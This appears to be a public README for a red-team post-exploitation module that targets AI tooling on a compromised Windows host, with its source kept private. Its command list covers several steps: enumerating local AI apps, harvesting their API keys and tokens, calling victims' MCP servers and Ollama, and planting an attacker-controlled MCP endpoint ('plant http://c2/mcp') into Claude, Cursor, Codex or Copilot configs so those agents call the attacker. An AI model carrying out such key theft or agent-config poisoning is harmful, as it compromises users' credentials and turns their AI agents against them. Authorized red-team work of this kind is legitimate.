# MCP operator (lab demo)

Red-team **operator module** for AI / MCP kit on a Windows foothold.

This public repo is a **demo README only**. Source, BOF objects, and path research stay in a **private** repository.

Lab / authorized engagements. Not a product, not a stealer drop.

## What it is

A single Demon / Beacon command: `mcp`.

It answers three operator questions:

1. **What AI stack is on this host?** — Claude, Cursor, Codex, Copilot, Ollama, OpenClaw, n8n, Langflow, Flowise, LM Studio, …
2. **Can we talk to their MCP / LLM?** — HTTP `tools/list` + `tools/call`, or the victim’s local Ollama as an operator brain.
3. **Do we persist into their agent?** — plant a named HTTP MCP into *their* config so *their* agent calls *us*.

```
                    mcp
         ┌──────────┼──────────┐
         │          │          │
       enum       keys       plant
         │          │          │
     files/exe    tokens    ania-mcp
     loopback     env/CM     HTTP MCP
         │
      list / call          ollama
     their MCP HTTP     127.0.0.1:11434
```

## Operator surface

```
mcp help
mcp enum                          # files + processes + loopback ports
mcp keys                          # identity material, read-only
mcp keys mem                      # optional, noisy
mcp <llm> keys                    # claude | cursor | gpt | copilot | claw | n8n | flow
mcp <llm> plant http://c2/mcp     # explicit llm only (no auto)
mcp list                          # probe known loopback MCP HTTP
mcp list http://127.0.0.1:5678/mcp-server/http
mcp call <url> <tool> [json]      # tools/call
mcp ollama tags|ps|ver|run
```

Plant and call are different:

- **plant** — *they* call *us* (persist inside Claude / Cursor / Codex / Copilot).
- **list / call** — *we* call *their* MCP server (n8n workflow, Langflow tool, …). HTTP JSON-RPC only. No `npx` stdio spawn.

## Loopback map (enum)

| port | service |
|---:|---|
| 11434 | Ollama |
| 5678 | n8n (`/mcp-server/http`) |
| 7860 | Langflow MCP |
| 3000 / 3001 | Flowise |
| 18789 / 19001 | OpenClaw gateway |
| 1234 | LM Studio |
| 1337 | Jan |
| 8080 | Open WebUI / LocalAI |
| 6277 | MCP Inspector |

## Design notes

- Inline-execute BOF, one `.o` per action. Loader is a Script Manager module.
- Keys path does not write loot to disk and does not open a second implant.
- Ollama stays on loopback. No model pull, no Modelfile drop.
- Optional in-memory key hunt is a separate command on purpose.

## Status

Private pack: **v1.2** (enum + keys + plant + ollama + MCP list/call).

Testing is local lab (mock MCP HTTP + existing Ollama). Full source is not in this repo.

---

*Maelstrom lab · DonMorpheus*
